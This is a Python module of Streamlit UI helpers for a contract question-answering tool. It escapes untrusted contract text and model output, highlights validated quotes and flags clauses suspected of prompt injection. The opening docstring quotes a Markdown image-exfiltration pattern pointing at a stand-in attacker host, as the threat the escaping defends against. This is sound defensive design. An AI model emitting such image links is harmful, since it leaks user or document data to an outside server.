"""Rendering helpers shared by the pages.

Contract text is counterparty-authored and model output is untrusted
(CLAUDE.md #11), so neither is ever passed to st.markdown: Markdown would
render a planted `![](https://attacker/?q=...)` as an image fetch. Untrusted
text goes through html.escape and st.html (which DOMPurify-sanitizes on top)
or st.text / st.code.

Quote highlighting locates a supporting quote the same way the citation
validator does (query/validation/citation_validator._locate_quote): curly
quotes and dashes normalized, whitespace runs collapsed, case-insensitive,
surrounding quote marks and periods ignored. So the highlighted span is the
text the validator matched, in the stored clause, not a paraphrase of it."""

from __future__ import annotations

import html
import re

import streamlit as st

_MIN_QUOTE_CHARS = 8

_CHAR_CLASS = {
    '"': "[\"“”]",
    "'": "['‘’]",
    "-": "[-–—]",
}

STATUS = {
    # final_status -> (tone, title, explanation)
    "answered": (
        "success",
        "Answered",
        "Every sentence below is a claim whose quote was checked word for word against the contract.",
    ),
    "answered_with_stripped_claims": (
        "warning",
        "Partly answered",
        "Some drafted claims failed the citation check and were removed; the claims shown passed it. "
        "The full draft was sent to a lawyer.",
    ),
    "not_found": (
        "info",
        "Not found in this contract",
        "Nothing was claimed. A lawyer has been asked to confirm the clause is really absent.",
    ),
    "flagged_for_review": (
        "warning",
        "Sent for lawyer review",
        "The system couldn't ground an answer in the contract, so it refused rather than guess.",
    ),
    "flagged_no_review": (
        "error",
        "Can't answer this question",
        "Please rephrase it as a question about this contract's clauses.",
    ),
}

VERDICT = {
    # closed set from crag_graph._VERDICT_TEXT
    "conflict": ("red", "Clauses conflict"),
    "no_conflict": ("green", "No conflict"),
    "differ": ("orange", "Clauses differ"),
    "equivalent": ("blue", "Equivalent in substance"),
}

CSS = """
<style>
.clause{border:1px solid rgba(128,128,128,.28);border-radius:10px;padding:12px 14px;margin:0 0 10px}
.clause.cited{border-color:rgba(234,170,0,.75);box-shadow:inset 3px 0 0 rgba(234,170,0,.95)}
.clause.flagged{border-color:rgba(255,75,75,.6)}
.clause-head{display:flex;gap:8px;align-items:baseline;flex-wrap:wrap;font-size:.85rem;margin-bottom:6px}
.clause-sec{font-weight:600}
.clause-id{font-family:ui-monospace,monospace;opacity:.55;font-size:.72rem}
.chip{font-size:.7rem;padding:1px 8px;border-radius:999px;background:rgba(128,128,128,.16);white-space:nowrap}
.chip.warn{background:rgba(255,75,75,.16);color:#e0453a}
.clause-text{white-space:pre-wrap;line-height:1.6;font-size:.9rem}
mark.q{background:rgba(255,196,0,.38);color:inherit;padding:1px 2px;border-radius:3px}
.qn,.num{display:inline-block;min-width:1.35em;height:1.35em;line-height:1.35em;border-radius:999px;
  background:rgba(234,170,0,.95);color:#1a1a1a;text-align:center;font-size:.7rem;font-weight:700;
  font-style:normal;margin-right:4px;vertical-align:1px}
.num{margin-right:8px}
.claim{font-size:1rem;line-height:1.55}
.quote{border-left:3px solid rgba(234,170,0,.95);padding:4px 10px;margin:8px 0 2px;font-style:italic;
  white-space:pre-wrap;opacity:.92;font-size:.9rem}
.plain{white-space:pre-wrap;line-height:1.55}
.meta{font-size:.78rem;opacity:.65}
</style>
"""


def inject_css() -> None:
    # Trusted constant; the only unsafe_allow_html in the UI.
    st.markdown(CSS, unsafe_allow_html=True)


# --- pure helpers (unit-tested in tests/ui) ---------------------------------


def _quote_pattern(quote: str) -> re.Pattern | None:
    core = re.sub(r"\s+", " ", quote).strip().strip(" .\"'“”‘’")
    if len(core) < _MIN_QUOTE_CHARS:
        return None
    parts = []
    for ch in core:
        if ch == " ":
            parts.append(r"\s+")
        elif ch in "“”":
            parts.append(_CHAR_CLASS['"'])
        elif ch in "‘’":
            parts.append(_CHAR_CLASS["'"])
        elif ch in "–—":
            parts.append(_CHAR_CLASS["-"])
        else:
            parts.append(_CHAR_CLASS.get(ch, re.escape(ch)))
    return re.compile("".join(parts), re.IGNORECASE)


def quote_span(text: str, quote: str | None) -> tuple[int, int] | None:
    """(start, end) of the first match of `quote` in `text`, or None."""
    if not quote:
        return None
    pattern = _quote_pattern(quote)
    match = pattern.search(text) if pattern else None
    return (match.start(), match.end()) if match else None


def highlight_html(text: str, quotes: list[tuple[str, str | None]]) -> str:
    """Escaped `text` with each (label, quote) found in it wrapped in <mark>.
    Overlapping matches keep the earliest; a quote not found is skipped."""
    spans = []
    for label, quote in quotes:
        span = quote_span(text, quote)
        if span:
            spans.append((*span, label))
    spans.sort()
    out, pos = [], 0
    for start, end, label in spans:
        if start < pos:
            continue
        out.append(html.escape(text[pos:start]))
        badge = f'<span class="qn">{html.escape(label)}</span>' if label else ""
        out.append(f'<mark class="q">{badge}{html.escape(text[start:end])}</mark>')
        pos = end
    out.append(html.escape(text[pos:]))
    return "".join(out)


def clause_card_html(clause: dict, quotes: list[tuple[str, str | None]] = ()) -> str:
    """One clause as a card. `clause` is a ClauseOut / ShownClause dict."""
    heading = " ".join(
        part for part in (clause.get("section_id") and f"§ {clause['section_id']}", clause.get("heading")) if part
    )
    chips = []
    if clause.get("clause_type"):
        chips.append(f'<span class="chip">{html.escape(clause["clause_type"])}</span>')
    if clause.get("parent_clause_id"):
        chips.append('<span class="chip">passage</span>')
    if clause.get("injection_suspected"):
        markers = ", ".join(clause.get("injection_markers") or []) or "instruction-like text"
        chips.append(f'<span class="chip warn">possible prompt injection: {html.escape(markers)}</span>')
    classes = "clause" + (" cited" if quotes else "") + (" flagged" if clause.get("injection_suspected") else "")
    return (
        f'<div class="{classes}"><div class="clause-head">'
        f'<span class="clause-sec">{html.escape(heading or "(untitled clause)")}</span>{"".join(chips)}'
        f'<span class="clause-id">{html.escape(clause.get("clause_id", ""))}</span></div>'
        f'<div class="clause-text">{highlight_html(clause.get("text", ""), list(quotes))}</div></div>'
    )


def claim_html(number: str, claim_text: str, quote: str | None) -> str:
    quote_html = f'<div class="quote">“{html.escape(quote)}”</div>' if quote else ""
    return f'<div class="claim"><span class="num">{html.escape(number)}</span>{html.escape(claim_text)}</div>{quote_html}'


def plain_html(text: str, css_class: str = "plain") -> str:
    return f'<div class="{css_class}">{html.escape(text)}</div>'


# --- Streamlit pieces --------------------------------------------------------


def show_status(tone: str, title: str, body: str) -> None:
    box = {"success": st.success, "warning": st.warning, "info": st.info, "error": st.error}[tone]
    icon = {"success": ":material/verified:", "warning": ":material/gavel:", "info": ":material/search_off:",
            "error": ":material/block:"}[tone]
    box(f"**{title}** — {body}", icon=icon)


def show_verdict(verdict: str | None) -> None:
    if verdict in VERDICT:
        color, label = VERDICT[verdict]
        st.badge(label, icon=":material/balance:", color=color)
        st.caption("The model's assessment of the quoted clauses. Verify before relying on it.")


def show_clauses(clauses: list[dict], quotes_by_clause: dict[str, list[tuple[str, str | None]]]) -> None:
    if clauses:
        st.html("".join(clause_card_html(c, quotes_by_clause.get(c["clause_id"], [])) for c in clauses))
